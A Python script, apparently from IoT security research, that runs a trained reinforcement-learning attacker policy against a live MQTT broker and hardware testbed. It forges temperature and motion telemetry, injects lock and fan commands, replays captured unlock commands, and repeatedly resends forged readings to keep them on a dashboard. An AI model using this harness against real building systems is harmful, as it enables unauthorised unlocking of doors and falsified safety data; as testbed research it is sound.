"""Run the TRAINED attacker PPO policy against the real broker/hardware.
to run : $env:AUTO_CONFIRM_LIVE_ATTACKS = "1"
python attacker/run_live_policy.py --model attacker_ppo.zip --steps 20 --stochastic --tick-seconds 5 --hold-seconds 5 --legit-interval 4


Unlike run_live_smoke_test.py (which forces every move once, to check the move
implementations themselves), this script loads the trained policy and lets IT
choose each move + params, exactly as it would during training -- just with
live telemetry standing in for the surrogate. This is the actual "does the
policy trained in sim still work on real hardware" validation.

Usage (repo root):
    set AUTO_CONFIRM_LIVE_ATTACKS=1      (optional, skips the actuation prompts)
    python attacker/run_live_policy.py --model models/attacker_ppo.zip --steps 40

Press Ctrl+C or create a file named LIVE_STOP in this folder to stop early.
"""

from __future__ import annotations

import argparse
import itertools
import json
import os
import sys
import time
from collections import deque
from pathlib import Path

import numpy as np

sys.path.insert(0, str(Path(__file__).resolve().parent))

from live_adapter import LiveBroker  # noqa: E402
from moves import AttackerState, AttackerView, MOVES, captured_unlock_commands, execute  # noqa: E402

K = 8
N_FEATURES = 6
N_PARAM_LEVELS = 5
STOP_FILE = Path(__file__).resolve().parent / "LIVE_STOP"


def confirm(msg: str) -> bool:
    if os.environ.get("AUTO_CONFIRM_LIVE_ATTACKS") == "1":
        print(f"{msg} [auto-confirmed]")
        return True
    return input(f"{msg} [y/N] ").strip().lower() == "y"


# Moves that actuate real hardware -- same gating as run_live_smoke_test.py.
# cmd_inject (servo/fan) and lock_replay (servo) move physical things; adjust
# this set if moves.py's indices differ from what run_live_smoke_test.py used.
HARDWARE_MOVES = {idx for idx, name in enumerate(MOVES) if name in ("cmd_inject", "lock_replay")}

# Which components are worth printing after each move, so a 5s wait between
#  "noop" prints nothing -- there's nothing to check after it.
RELEVANT_COMPONENTS = {
    "temp_spoof": {"temp_1"},
    "const_bias": {"temp_1"},
    "gradual_drift": {"temp_1"},
    "pir_freeze": {"motion_1"},
    "pir_spoof": {"motion_1"},
    "cmd_inject": {"lock_1", "fan_1"},
    "lock_replay": {"lock_1"},
    "noop": set(),
}


def inject_legit_unlock(host: str, port: int, lock_topic: str, source: str, gap: float) -> None:
    """Publish a simulated LEGITIMATE operator unlock-then-lock cycle, straight to
    the broker over a SEPARATE connection, bypassing moves.py/execute() entirely.

    Confirmed from live_adapter.py: LiveBroker._on_message tags any message it
    receives as origin="operator" UNLESS it's the echo of something that same
    LiveBroker instance just published itself (those get origin="attacker" via
    deliver_command). So the attacker's own cmd_inject commands can never look
    like captured operator traffic -- they're tagged "attacker" at the source.
    Publishing from a totally separate MQTT connection (this function) is
    exactly what makes LiveBroker see it as outside, "operator" traffic that
    moves.py's captured_unlock_commands() can pick up.
    """
    import paho.mqtt.publish as publish

    user = os.environ.get("MQTT_USERNAME")
    pw = os.environ.get("MQTT_PASSWORD")
    auth = {"username": user, "password": pw} if user else None

    publish.single(lock_topic, json.dumps({"action": "unlock", "source": source}),
                    hostname=host, port=port, auth=auth)
    time.sleep(gap)
    publish.single(lock_topic, json.dumps({"action": "lock", "source": source}),
                    hostname=host, port=port, auth=auth)


class LiveObsBuilder:
    """Builds the 'snapshot' the AI model looks at before it picks its next move.

    When the model was trained, it only ever saw data in ONE specific shape:
    the last 8 readings, 6 numbers each, scaled a certain way. If we show it
    data in a different shape, it won't know what it's looking at -- kind of
    like handing someone a test written in a format they never studied for.

    This class's job is just to take REAL sensor data from the real hardware
    and reshape it into that exact same format, so the model sees something
    that looks just like what it trained on, even though the data is now
    coming from real devices instead of the simulator.
    """

    def __init__(self):
        self.last_action = (0, 0.0, 0.0)
        self._cur = {"temp": 0.0, "hum": 0.0, "motion": 0.0, "lock_open": 0.0, "fan_on": 0.0}
        self._window = deque([np.zeros(N_FEATURES, np.float32) for _ in range(K)], maxlen=K)

    def ingest(self, events) -> bool:
        """Update running state from a batch of broker events. Returns whether
        a temp_1 telemetry message was seen (the got_temp feature)."""
        got_temp = False
        c = self._cur
        for e in events:
            if not e.is_telemetry:
                continue
            d, cid = e.payload["data"], e.component_id
            if cid == "temp_1":
                c["temp"] = (d["temperature"] - 24.0) / 10.0
                c["hum"] = (d["humidity"] - 48.0) / 20.0
                got_temp = True
            elif cid == "motion_1":
                c["motion"] = float(d["motion"])
            elif cid == "lock_1":
                c["lock_open"] = float(d["state"] == "unlocked")
            elif cid == "fan_1":
                c["fan_on"] = float(d["state"] == "on")
        return got_temp

    def push_window(self, got_temp: float) -> None:
        c = self._cur
        self._window.append(np.array(
            [c["temp"], c["hum"], c["motion"], c["lock_open"], c["fan_on"], got_temp],
            dtype=np.float32))

    def obs(self, env) -> np.ndarray:
        move, p1, p2 = self.last_action
        onehot = np.zeros(len(MOVES), np.float32)
        onehot[move] = 1.0
        has_capture = float(len(captured_unlock_commands(env)) > 0)
        obs = np.concatenate([np.concatenate(self._window), onehot,
                              np.array([p1, p2, has_capture], np.float32)])
        return np.clip(obs, -5.0, 5.0).astype(np.float32)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--model", required=True, help="Path to the saved SB3 PPO model (.zip)")
    ap.add_argument("--steps", type=int, default=40,
                     help="How many policy steps to run. Ignored if --forever is set.")
    ap.add_argument("--forever", action="store_true",
                     help="Keep running until you press Ctrl+C or create a file named "
                          "LIVE_STOP in the attacker/ folder. Overrides --steps.")
    ap.add_argument("--tick-seconds", type=float, default=2.0,
                     help="How long to wait after each move for the device to react/publish")
    ap.add_argument("--hold-seconds", type=float, default=0.0,
                     help="After a move sends a forged value, keep resending the SAME value every "
                          "0.5s for this many seconds before moving on. The real sensor publishes "
                          "its own true reading every ~1-2s regardless of the attacker, so a single "
                          "forged message usually loses that race before a slow-refreshing dashboard "
                          "ever shows it. Holding the value makes it visible. 0 (default) = off, "
                          "send once like before. Try 4-6 for a 2-second-refresh dashboard.")
    ap.add_argument("--stochastic", action="store_true",
                     help="Sample from the policy's action distribution instead of taking its "
                          "greedy/argmax action. The greedy action tends to collapse onto whichever "
                          "move the policy currently considers best overall and repeat it; sampling "
                          "shows the fuller range of moves (including cmd_inject on lock/fan) the "
                          "policy actually assigns probability to.")
    ap.add_argument("--force-fan-check", action="store_true",
                     help="Before the policy loop starts, directly send one cmd_inject fan "
                          "safe_mode call (bypassing the policy) just to confirm the fan "
                          "actuator itself is reachable from this script. This is NOT part of "
                          "the policy's own behavior -- the policy may rarely or never choose "
                          "this branch on its own (see cmd_inject's p1 parameter).")
    ap.add_argument("--legit-interval", type=int, default=0,
                     help="Every N steps, inject a simulated LEGITIMATE operator unlock+lock "
                          "cycle (bypassing the policy) so lock_replay actually has something to "
                          "capture and replay. Without this, lock_replay will be 'invalid -- "
                          "nothing captured' in every run, since nothing in this script ever "
                          "generates real operator traffic. 0 (default) = off. Try 4-6.")
    ap.add_argument("--legit-source", default="operator",
                     help="The 'source' tag used for the simulated legit command, distinct from "
                          "cmd_inject's 'dashboard' tag (default: operator).")
    ap.add_argument("--legit-gap", type=float, default=2.0,
                     help="Seconds between the simulated legit unlock and the follow-up lock.")
    ap.add_argument("--broker-host", default=os.environ.get("MQTT_HOST", "localhost"))
    ap.add_argument("--broker-port", type=int, default=int(os.environ.get("MQTT_PORT", "1883")))
    args = ap.parse_args()

    lock_topic = "building/lock_1/commands"

    from stable_baselines3 import PPO  # imported late so --help works without SB3 installed
    print(f"Loading policy from {args.model} ...")
    model = PPO.load(args.model)

    print("This runs the TRAINED ATTACKER POLICY against YOUR real broker/hardware. "
          "It can choose to move the real servo or actuate the fan relay on its own.")
    if not confirm("Continue?"):
        return

    with LiveBroker() as env:
        view, state = AttackerView(), AttackerState()
        builder = LiveObsBuilder()

        if args.force_fan_check:
            fan_move = next(i for i, name in enumerate(MOVES) if name == "cmd_inject")
            print("\n[forced check] sending cmd_inject fan safe_mode directly (p1=1.0, p2=0.0) "
                  "-- this bypasses the policy, just to confirm the fan actuator is reachable")
            if confirm("  this actuates hardware -- send it?"):
                events, valid = execute(env, view, state, fan_move, 1.0, 0.0)
                if not valid:
                    print("  move was invalid here -- nothing sent")
                else:
                    for e in events:
                        print(f"  sent -> {e.topic}: {e.payload}")
                    mark = len(env.log)
                    time.sleep(args.tick_seconds)
                    recent = env.log[mark:]   # only what actually arrived during this wait
                    builder.ingest(recent)
                    relevant = RELEVANT_COMPONENTS["cmd_inject"]
                    for e in recent:
                        if e.is_telemetry and e.component_id in relevant:
                            print(f"  device replied <- {e.topic}: {e.payload['data']}")
                    view.update(recent)
                    builder.last_action = (fan_move, 1.0, 0.0)
                    builder.push_window(0.0)

        step_iter = itertools.count() if args.forever else range(args.steps)
        try:
            for step in step_iter:
                if STOP_FILE.exists():
                    print(f"\n{STOP_FILE.name} found -- stopping.")
                    break

                if args.legit_interval > 0 and step % args.legit_interval == 0:
                    print(f"\n[legit traffic] simulating an operator unlock+lock cycle "
                          f"(source={args.legit_source!r}) for lock_replay to capture")
                    try:
                        inject_legit_unlock(args.broker_host, args.broker_port, lock_topic,
                                             args.legit_source, args.legit_gap)
                    except Exception as e:
                        print(f"  FAILED: {e}")
                    mark = len(env.log)
                    time.sleep(0.5)  # let env's own subscriber pick up what just happened
                    recent = env.log[mark:]
                    builder.ingest(recent)
                    view.update(recent)

                obs = builder.obs(env)
                action, _ = model.predict(obs, deterministic=not args.stochastic)
                move, i1, i2 = (int(a) for a in action)
                p1, p2 = i1 / (N_PARAM_LEVELS - 1), i2 / (N_PARAM_LEVELS - 1)

                print(f"\n[step {step}] policy chose {MOVES[move]} (p1={p1}, p2={p2})")

                if move in HARDWARE_MOVES and not confirm("  this move actuates hardware -- send it?"):
                    print("  skipped")
                    builder.last_action = (move, p1, p2)
                    builder.push_window(0.0)
                    continue

                try:
                    events, valid = execute(env, view, state, move, p1, p2)
                except Exception as e:
                    print(f"  FAILED: {e}")
                    continue

                if not valid:
                    print("  move was invalid here (e.g. nothing captured yet) -- nothing sent, "
                          "treating as noop for the observation")
                    builder.last_action = (move, p1, p2)
                    builder.push_window(0.0)
                    continue

                for e in events:
                    print(f"  sent -> {e.topic}: {e.payload}")

                # Hold: keep resending the same forged value so it survives long enough
                # for a slow-refreshing dashboard to actually show it, instead of losing
                # the race against the real sensor's own next publish.
                if args.hold_seconds > 0 and events and events[0].is_telemetry:
                    held_until = time.monotonic() + args.hold_seconds
                    resends = 0
                    while time.monotonic() < held_until:
                        time.sleep(0.5)
                        try:
                            hold_events, hold_valid = execute(env, view, state, move, p1, p2)
                        except Exception as e:
                            print(f"  (hold) FAILED: {e}")
                            break
                        if not hold_valid:
                            break
                        resends += 1
                    print(f"  (held value with {resends} resend(s) over {args.hold_seconds}s)")

                mark = len(env.log)
                time.sleep(args.tick_seconds)
                recent = env.log[mark:]   # only what actually arrived during this wait
                got_temp = builder.ingest(recent)
                relevant = RELEVANT_COMPONENTS.get(MOVES[move], set())
                for e in recent:
                    if e.is_telemetry and e.component_id in relevant:
                        print(f"  device replied <- {e.topic}: {e.payload['data']}")
                view.update(recent)

                builder.last_action = (move, p1, p2)
                builder.push_window(got_temp)
        except KeyboardInterrupt:
            print("\nCtrl+C -- stopping.")

    print("\nDone. Check the dashboard / event log against what the policy chose above.")


if __name__ == "__main__":
    main()
